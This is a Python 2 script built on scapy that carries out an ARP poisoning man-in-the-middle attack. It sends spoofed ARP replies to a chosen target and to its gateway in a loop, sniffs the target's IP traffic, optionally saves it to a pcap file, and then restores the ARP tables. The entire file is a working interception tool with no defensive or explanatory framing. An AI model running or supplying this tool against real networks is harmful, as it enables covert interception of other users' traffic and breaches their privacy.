from scapy.all import *
import os
import sys
import threading
import signal


def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    print "[*] Restoring Target ..."
    send(ARP(op=2, psrc=gateway_ip,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip,pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    for s,r in responses:
        return r[Ether].src

    return None


def poison_target(gateway_ip,gateway_mac,target_ip,target_mac,stop_event):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print "[*] Begininning the ARP Poison ...[CTRL-C to stop]"

    while True:
        send(poison_target)
        send(poison_gateway)

        if stop_event.wait(2):
            break

    print "[*] ARP Poison Attack Finished."
    return


def arp_poisoning():
    print "set LHOST interface (Example: eth0"
    interface = raw_input(">>")
    print "set Target IP Address"
    target_ip = raw_input(">>")
    print "set Target Gateway IP Address"
    gateway_ip = raw_input(">>")
    print "set Amount of sniffer packets you want to receive."
    packet_count = int(input(">>"))
    print "Do you want to save pcap file?(Y/n)"
    pcap_flag = raw_input(">>")

    conf.iface = interface
    conf.verb = 0

    print "[*] Setting up %s" % interface
    gateway_mac = get_mac(gateway_ip)

    if gateway_mac is None:
        print "[!!1] Failed to get gateway MAC. Exiting."
        sys.exit(0)
    else:
        print "[*] Gateway %s is at %s" % (gateway_ip,gateway_mac)

    target_mac = get_mac(target_ip)

    if target_mac is None:
        print "[!!!] Failed to get target MAC. Exiting."
        sys.exit(0)
    else:
        print "[*] Target %s is at %s" % (target_ip,target_mac)

    stop_event = threading.Event()
    poison_thread = threading.Thread(target = poison_target, args= (gateway_ip,gateway_mac,target_ip,target_mac,stop_event))

    poison_thread.start()

    print "[*] Starting sniffer for %d packets" % packet_count

    bpf_filter = "ip host %s" % target_ip
    packets  =sniff(count=packet_count,filter=bpf_filter,iface=interface)

    if pcap_flag == "Y":
        wrpcap("arper.pcap",packets)
        print "[*] Saved pcap file... " 
    stop_event.set()
    poison_thread.join()

    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
